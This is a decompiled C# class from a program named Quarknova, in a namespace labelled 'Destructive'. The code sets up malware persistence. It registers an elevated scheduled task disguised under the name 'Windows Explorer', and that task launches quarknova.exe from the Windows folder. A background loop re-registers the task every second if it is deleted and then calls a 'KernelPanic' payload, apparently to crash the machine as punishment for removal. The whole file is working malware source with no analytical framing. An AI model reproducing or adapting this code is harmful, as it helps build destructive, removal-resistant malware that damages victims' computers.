using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using Microsoft.Win32.TaskScheduler;
using Quarknova.Main;

namespace Quarknova.Destructive
{
	// Token: 0x0200000C RID: 12
	public static class Startup
	{
		// Token: 0x06000098 RID: 152 RVA: 0x000059EC File Offset: 0x00003BEC
		public static void AddToStartup()
		{
			Startup.taskSrv = new TaskService();
			using (TaskDefinition taskDefinition = Startup.taskSrv.NewTask())
			{
				taskDefinition.Principal.RunLevel = 1;
				taskDefinition.Triggers.AddNew(9);
				Startup.TaskPath = Path.GetPathRoot(Path.GetTempPath()) + "Windows\\quarknova.exe";
				Startup.execAct = new ExecAction(Startup.TaskPath, "-startuproutine", null);
				taskDefinition.Actions.Add<ExecAction>(Startup.execAct);
				Startup.taskSrv.RootFolder.RegisterTaskDefinition("Windows Explorer", taskDefinition);
			}
		}

		// Token: 0x06000099 RID: 153 RVA: 0x00005A9C File Offset: 0x00003C9C
		public static void EnsureStartupLoop()
		{
			new Thread(delegate()
			{
				for (;;)
				{
					if (!Startup.RootFolderContainsPath(Path.GetPathRoot(Path.GetTempPath()).ToLower() + "windows\\quarknova.exe"))
					{
						Startup.AddToStartup();
						Payloads.KernelPanic();
					}
					Thread.Sleep(1000);
				}
			}).Start();
		}

		// Token: 0x0600009A RID: 154 RVA: 0x00005AC8 File Offset: 0x00003CC8
		public static bool RootFolderContainsPath(string path)
		{
			int num = 0;
			using (IEnumerator<Task> enumerator = Startup.taskSrv.RootFolder.Tasks.GetEnumerator())
			{
				while (enumerator.MoveNext())
				{
					if (((ExecAction)enumerator.Current.Definition.Actions[0]).Path.ToLower() == path.ToLower())
					{
						num++;
					}
				}
			}
			return num > 0;
		}

		// Token: 0x0600009B RID: 155 RVA: 0x00005B4C File Offset: 0x00003D4C
		public static void Dispose()
		{
			Startup.taskSrv.Dispose();
			Startup.execAct.Dispose();
		}

		// Token: 0x04000035 RID: 53
		private static TaskService taskSrv;

		// Token: 0x04000036 RID: 54
		private static ExecAction execAct;

		// Token: 0x04000037 RID: 55
		public static string TaskPath;
	}
}
